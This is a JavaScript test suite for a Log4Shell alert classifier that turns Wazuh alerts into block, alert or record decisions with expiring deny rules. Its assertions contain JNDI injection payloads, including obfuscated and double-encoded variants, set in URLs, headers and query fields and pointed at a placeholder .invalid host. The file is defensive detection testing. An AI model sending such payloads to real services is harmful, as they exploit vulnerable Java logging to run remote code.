import test from 'node:test';
import assert from 'node:assert/strict';
import {readFile} from 'node:fs/promises';
import {decide} from '../xdr/known-cve/decide.mjs';
import {readAlerts,parseAlerts} from '../xdr/known-cve/read-alerts.mjs';
import {makeRule,rulesFromDecisions} from '../xdr/known-cve/respond.mjs';
import {createGuard} from '../xdr/web-injection/connect.mjs';

const fixture=JSON.parse(await readFile(new URL('../xdr/fixtures/known-cve.json',import.meta.url),'utf8'));
test('fixture count equals redacted extracted lines, and every pattern has a source',async()=>{
 const raw=fixture.alerts;
 assert.equal(raw.length,18);
 assert.equal((await readAlerts()).length,raw.length);
 const example=structuredClone(raw[0]);
 example.rule.description='test token=should_not_be_in_logs password=not-for-display';
 const output=parseAlerts({alerts:[example]});
 assert.equal(output.length,1);
 assert.ok(!JSON.stringify(output).includes('should_not_be_in_logs'));
 assert.ok(!JSON.stringify(output).includes('not-for-display'));
 const patterns=JSON.parse(await readFile(new URL('../xdr/known-cve/patterns.json',import.meta.url),'utf8'));
 assert.ok(patterns.length>=3);
 assert.ok(patterns.every(x=>x.name&&x.condition&&x.basis));
});
test('standalone offline decide classifies 6 clear, 6 suspicious, and 6 normal',async()=>{
 const code=await readFile(new URL('../xdr/known-cve/decide.mjs',import.meta.url),'utf8');
 assert.doesNotMatch(code,/^\s*import\s/mu);
 assert.doesNotMatch(code,/\b(?:readFile|writeFile|fetch|require)\s*\(/u);
 const isolated=await import('data:text/javascript;base64,'+Buffer.from(code).toString('base64'));
 const counts={block:0,alert:0,record:0};
 for(const [index,alert] of fixture.alerts.entries()){
  const a=isolated.decide(alert);
  assert.deepEqual(a,decide(alert));
  assert.ok(a.confidence>=0&&a.confidence<=1);
  assert.equal(a.action,index<6?'block':index<12?'alert':'record');
  assert.equal(a.action,a.confidence>=.85?'block':a.confidence>=.5?'alert':'record');
  assert.ok(typeof a.reason==='string'&&a.reason.length>3);
  counts[a.action]++;
 }
 assert.deepEqual(counts,{block:6,alert:6,record:6});
});
test('encoded and header JNDI syntax is clear, vague scanning remains alert',()=>{
 const alert=structuredClone(fixture.alerts[0]);
 alert.rule.mitre=[];
 alert.rule.level=5;
 assert.equal(decide(alert).action,'block');
 alert.data.url='/docs?topic=log4j';
 alert.rule.description='log4shell vulnerability probe';
 assert.equal(decide(alert).action,'alert');
 alert.rule.description='정상 문서 조회';alert.rule.level=2;
 assert.equal(decide(alert).action,'record');
 const sample=structuredClone(fixture.alerts[1]);
 sample.data.headers={'User-Agent':'ordinary browser'};
 sample.rule.description='로그 취약점 탐색 경보';
 assert.equal(decide(sample).action,'alert');
});
test('only high confidence CVE exploitation creates expiring evidence-linked deny rules',async()=>{
 const rows=fixture.alerts.map(alert=>({alert,decision:decide(alert),
   fixtureNormal:alert.fixture.classification==='normal'}));
 const rules=rulesFromDecisions(rows);
 assert.equal(rules.length,6);
 assert.equal(new Set(rules.map(x=>x.sourceIp)).size,6);
 for(let i=0;i<rules.length;i++){
  assert.equal(rules[i].alertId,fixture.alerts[i].id);
  assert.ok(rules[i].id.startsWith('xdr.known-cve.'));
  assert.equal(Date.parse(rules[i].expiresAt)-Date.parse(rules[i].startsAt),900000);
  assert.ok(rules[i].pattern.startsWith('log4shell-'));
 }
 assert.equal(makeRule(fixture.alerts[12],{action:'block',confidence:1,reason:'log4shell-jndi-lookup'},
  Date.parse(fixture.alerts[12].timestamp)),null);
 assert.equal(makeRule(fixture.alerts[0],decide(fixture.alerts[0]),
  Date.parse(fixture.alerts[0].timestamp)+16*60000),null);
 // A normal sample from the same IP cancels address-wide deny candidates.
 const clone=structuredClone(fixture.alerts[12]);clone.data.srcip=fixture.alerts[0].data.srcip;
 const safeRules=rulesFromDecisions([...rows,{alert:clone,decision:decide(clone),fixtureNormal:true}]);
 assert.equal(safeRules.length,5);
 const baseline={schema:'aleph.decision.v1',requestId:'synthetic',decision:'allow',
  reasonCode:'approved',ruleIds:[]};
 const guard=createGuard(async()=>baseline,async()=>rules);
 for(const sample of fixture.alerts){
  const now=Date.parse(sample.timestamp);
  const result=await guard({requestId:'synthetic'},{sourceIp:sample.data.srcip,now});
  assert.equal(result.decision,decide(sample).action==='block'?'deny':'allow');
 }
 const first=fixture.alerts[0];
 assert.deepEqual(await guard({requestId:'synthetic'},
  {sourceIp:first.data.srcip,now:Date.parse(first.timestamp)+16*60000}),baseline);
});

test('Wazuh repeated T1190 exploitation is block even when URL is only a marker',()=>{
 const a=structuredClone(fixture.alerts[6]);
 a.rule={level:12,mitre:['T1190'],description:'Log4j 원격 조회 악용 요청이 여러 번 관측되었습니다'};
 a.data={srcip:'203.0.113.88',url:'/notes?q=doc-log4j-repeat',count:'12'};
 const out=decide(a);
 assert.deepEqual(out,{action:'block',confidence:0.96,reason:'log4shell-repeated-exploit'});
 const b=structuredClone(a);b.rule.description='CVE-2021-44228 취약점 악용 요청 8건';
 assert.equal(decide(b).action,'block');
 const c=structuredClone(a);c.rule.description='JNDI remote lookup 공격 반복';
 assert.equal(decide(c).action,'block');
});

test('Wazuh repeated pattern needs all of MITRE tag severity count and exploit family evidence',()=>{
 const base=structuredClone(fixture.alerts[0]);
 base.rule={level:11,mitre:{id:['T1190']},description:'Log4j remote lookup exploitation'};
 base.data={srcip:'203.0.113.88',url:'/notes?marker=doc',count:'9'};
 assert.equal(decide(base).action,'block');
 const variants=[
  a=>{a.rule.level=9;},
  a=>{a.data.count='4';},
  a=>{a.data.count=undefined;},
  a=>{a.data.count='not-a-number';},
  a=>{a.rule.mitre=[];},
  a=>{a.rule.description='기존 일반 서비스에서 반복된 요청';},
 ];
 for(const mutate of variants){
  const a=structuredClone(base);mutate(a);
  assert.notEqual(decide(a).action,'block');
 }
});
test('a high-severity vulnerability scanner with repeated count remains alert-only',()=>{
 const a=structuredClone(fixture.alerts[0]);
 a.rule={level:12,mitre:['T1190'],description:'Log4j CVE-2021-44228 취약점 스캔 도구 점검'};
 a.data={srcip:'192.0.2.29',url:'/help?q=log4shell-check',count:'20'};
 assert.equal(decide(a).action,'alert');
 assert.ok(decide(a).confidence>=0.5&&decide(a).confidence<0.85);
 const b=structuredClone(a);b.rule.description='Log4j vulnerability scanner probe';
 assert.equal(decide(b).action,'alert');
});
test('high-level ambiguous one-off Log4j request stays alert and never blocks',()=>{
 const a=structuredClone(fixture.alerts[6]);
 a.rule={level:11,mitre:{id:'T1190'},description:'JNDI Log4j 원격 조회 탐색'};
 a.data={srcip:'192.0.2.31',url:'/notes?q=doc',count:'1'};
 assert.equal(decide(a).action,'alert');
});
test('ordinary low-severity CVE or Log4j documentation remains record',()=>{
 for(const title of [
  'Log4j CVE-2021-44228 패치 문서를 확인했습니다',
  'JNDI 사용 설명서를 열었습니다',
  'Log4Shell vulnerability scanning guide educational page',
 ]){
  const a=structuredClone(fixture.alerts[12]);
  a.rule={level:2,mitre:[],description:title};
  a.data={url:'/docs?q=log4j',srcip:'192.0.2.45'};
  assert.equal(decide(a).action,'record',title);
 }
});
test('request payload obfuscation remains a direct block without structural metadata',()=>{
 const a=structuredClone(fixture.alerts[13]);
 a.rule={level:2,mitre:[],description:'메모 페이지 로드'};
 a.data={url:'/search?q='+encodeURIComponent(encodeURIComponent('${jndi:ldap://lookup.invalid/a}'))};
 assert.equal(decide(a).action,'block');
 a.data={query:'${${env:NAME:-j}ndi:rmi://lookup.invalid/b}'};
 assert.equal(decide(a).action,'block');
 a.data={http:{headers:{'X-Request-ID':'${${lower:j}ndi:dns://lookup.invalid/check}'}}};
 assert.equal(decide(a).action,'block');
});
test('invalid unexpected input returns a safe record result without exceptions',()=>{
 for(const candidate of [null,0,undefined,{},[],{rule:{level:1000,mitre:['T1190']},data:{count:'999'}},
  {rule:{level:12,mitre:['T1190'],description:'Log4j exploit'},data:{count:'-1'}},
 ]){
  const answer=decide(candidate);
  assert.ok(['block','alert','record'].includes(answer.action));
  assert.equal(typeof answer.reason,'string');
  assert.ok(answer.confidence>=0&&answer.confidence<=1);
  assert.notEqual(answer.action,'block');
 }
});

test('complete bare lookup blocks only when Wazuh corroborates it',()=>{
 const a=structuredClone(fixture.alerts[13]);
 a.data={url:'/search?q=jndi:ldap://lookup.invalid/example'};
 a.rule={level:8,mitre:[],description:'비정상 HTTP 요청'};
 assert.deepEqual(decide(a),{action:'block',confidence:0.93,reason:'log4shell-jndi-lookup'});
 a.rule.level=2;
 assert.equal(decide(a).action,'record');
 a.rule.level=3;a.rule.mitre=['T1190'];
 assert.equal(decide(a).action,'block');
 a.rule.mitre=[];a.rule.level=9;
 a.data.url='/search?q=jndi:ldap://';
 assert.notEqual(decide(a).action,'block');
});
test('bounded nested headers and request arrays carry HTTP evidence',()=>{
 const a=structuredClone(fixture.alerts[13]);
 a.rule={level:9,mitre:['T1190'],description:'의심 요청'};
 a.data={http:{request:{headers:[{name:'X-Request-Id',value:'\x24{jndi:ldap://lookup.invalid/header}'}]}}};
 assert.equal(decide(a).action,'block');
 a.data={headers:[{name:'User-Agent',value:'jndi:rmi://lookup.invalid/header'}]};
 assert.equal(decide(a).action,'block');
 a.data={request:{args:{q:encodeURIComponent('\x24{jndi:dns://lookup.invalid/query}')}}};
 assert.equal(decide(a).action,'block');
 a.data={extra_data:{http:{headers:[{name:'Referer',value:'\x24{jndi:ldap://lookup.invalid/check}'}]}}};
 assert.equal(decide(a).action,'block');
 a.data={user:{profile:{freeText:'\x24{jndi:ldap://lookup.invalid/benign}'}},url:'/notes'};
 assert.notEqual(decide(a).action,'block');
});
test('complete lookup in Wazuh rule description needs corroborating evidence',()=>{
 const a=structuredClone(fixture.alerts[13]);
 a.data={url:'/notes'};
 a.rule={level:8,mitre:[],description:'요청 본문에서 jndi:ldap://lookup.invalid/path 확인'};
 assert.deepEqual(decide(a),{action:'block',confidence:0.9,reason:'log4shell-jndi-lookup'});
 a.rule.level=5;
 assert.equal(decide(a).action,'alert');
 a.rule.mitre=['T1190'];
 assert.equal(decide(a).action,'block');
 a.rule={level:2,mitre:[],description:'jndi:ldap://lookup.invalid/path 기초 설명 문서 조회'};
 assert.equal(decide(a).action,'record');
 a.rule={level:8,mitre:[],description:'요청에서 \x24{jndi:rmi://lookup.invalid/path} 형태 확인'};
 assert.equal(decide(a).action,'block');
});
test('truncated lookup and CVE scan tools remain alert, normal guide stays record',()=>{
 const a=structuredClone(fixture.alerts[13]);
 a.data={url:'/notes?q=jndi:ldap://'};
 a.rule={level:8,mitre:['T1190'],description:'원격 조회 신호 조사'};
 assert.equal(decide(a).action,'alert');
 a.rule={level:11,mitre:['T1190'],description:'nuclei Log4Shell 취약점 검사'};
 a.data={url:'/notes',count:'15'};
 assert.equal(decide(a).action,'alert');
 a.rule.description='Log4j-Scanner vulnerability scan report';
 assert.equal(decide(a).action,'alert');
 a.rule={level:2,mitre:[],description:'CVE-2021-44228 정상 문서 조회'};
 assert.equal(decide(a).action,'record');
});
test('unexpected Wazuh fixture shapes and circular request objects stay safe',()=>{
 const cases=[{id:'x'},[],{data:{request:[{headers:[null,23,{value:'plain'}]}]}},
  {rule:{level:'invalid',mitre:{id:12}},data:{headers:[{value:32}]}},
  {data:{http:{request:{headers:[]}}}},
 ];
 const cycle={};cycle.self=cycle;
 cases.push({rule:{level:5},data:{args:cycle}});
 for(const item of cases){
  const out=decide(item);
  assert.ok(['block','alert','record'].includes(out.action));
  assert.ok(out.confidence>=0&&out.confidence<=1);
  assert.equal(typeof out.reason,'string');
 }
 assert.equal(decide({rule:{level:2,mitre:[]},data:{url:'/guide?q=log4j'}}).action,'record');
});
